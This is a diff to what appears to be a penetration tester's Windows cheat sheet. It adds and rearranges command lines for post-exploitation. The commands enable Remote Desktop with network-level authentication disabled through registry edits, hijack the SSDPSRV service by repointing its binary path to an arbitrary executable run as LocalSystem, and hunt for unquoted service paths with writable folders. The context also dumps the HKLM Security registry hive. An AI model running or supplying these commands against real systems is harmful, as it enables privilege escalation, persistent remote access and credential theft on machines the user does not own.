@@ -83,14 +83,6 @@
 	$ wmic process where name="process_name" call terminate		# terminate the program
 	$ wmic /output:test.csv startup list full /format:csv
 	$ wmic /output:test.csv product get caption, installdate, installlocation, packagecache, vendor, version /format:csv 
-	
-	# Get the unquoted service path
-	$ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """	
-	#### Get unquoted path and check for the folders and files cacls or icacls for write and execute privilege ####
-	
-	$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
-	$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
-	
 
 8. Registry command: (most of the time require Administrator)
 	$ reg save HKLM\Security security.hive
@@ -113,11 +105,23 @@
 	$ netsh trace start capture=yes IPv4.Address=[localIP]		# After successful got Administrator start capture pcap without install netcat
 	$ netsh trace stop											# 
 	
+	Enable RDP
+	$ netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+	$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /f /v UserAuthentication /t REG_DWORD /d 0
+	$ reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+	
+	Weak Service escalation
 	$ accesschk.exe /accepteula -uwqvc "Authenticated Users" * > auth-txt
 	$ sc config SSDPSRV binpath= "C:\Inetpub\bla.exe"
 	$ sc config SSDPSRV obj= ".\LocalSystem" password= ""
 	$ sc config SSDPSRV start= demand
 	$ net start SSDPSRV
+	
+	Get the unquoted service path
+	$ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """	
+	#### Get unquoted path and check for the folders and files cacls or icacls for write and execute privilege ####
+	$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+	$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
 
 10. Powershell runas
 	$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
